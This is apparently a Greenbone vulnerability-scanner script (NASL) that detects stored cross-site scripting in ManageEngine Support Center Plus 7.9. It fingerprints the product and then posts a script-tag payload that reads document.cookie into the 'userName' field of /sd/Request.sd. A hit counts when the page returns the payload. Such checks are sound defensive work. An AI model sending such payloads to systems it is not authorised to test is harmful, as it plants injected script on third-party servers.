# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802839");
  script_version("2024-06-27T05:05:29+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-04-24 13:18:35 +0530 (Tue, 24 Apr 2012)");
  script_name("Zoho ManageEngine Support Center Plus Multiple Fields XSS Vulnerabilities");
  script_xref(name:"URL", value:"http://1337day.com/exploits/18057");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53019");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/74873");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18745/");

  script_category(ACT_DESTRUCTIVE_ATTACK); # Stored XSS
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"ManageEngine Support Center Plus 7.9 Upgrade Pack 7903 and prior.");

  script_tag(name:"insight", value:"The flaws are due to inputs passed to the 'Name' and 'E-mail'
  parameters via 'sd/Request.sd' script is not properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"Upgrade to ManageEngine Support Center Plus 7.9 Upgrade Pack 7908 or later.");

  script_tag(name:"summary", value:"Zoho ManageEngine Support Center Plus is prone to multiple
  cross-site scripting (XSS) vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:8080);

host = http_host_name(port:port);

res = http_get_cache(item:"/", port:port);

if(res && ">ManageEngine SupportCenter Plus<" >< res &&
   "ZOHO Corp" >< res)
{
  url = "/sd/Request.sd";
  postdata = "departmentID=1&userName=<script>alert(document.cookie)</script>" +
             "&emailID=abc%40gmail.com&title=XSS-TEST&description=ggg&save=" +
             "Submit";

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Cookie: JSESSIONID=B15D245B03E7FE757424FA08D41E01AB; " +
               "PREV_CONTEXT_PATH=; JSESSIONID=A8CF0BA0D9E4C252DC00EE2B7EB6FAE8\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);

  res = http_keepalive_send_recv(port:port, data:req);

  if(res && egrep(pattern:"^HTTP/1\.[01] 200", string:res, icase:TRUE) &&
     "Customer Portal" >< res &&
     "<script>alert(document.cookie)</script>" >< res){
    security_message(port:port);
    exit(0);
  }
}

exit(99);
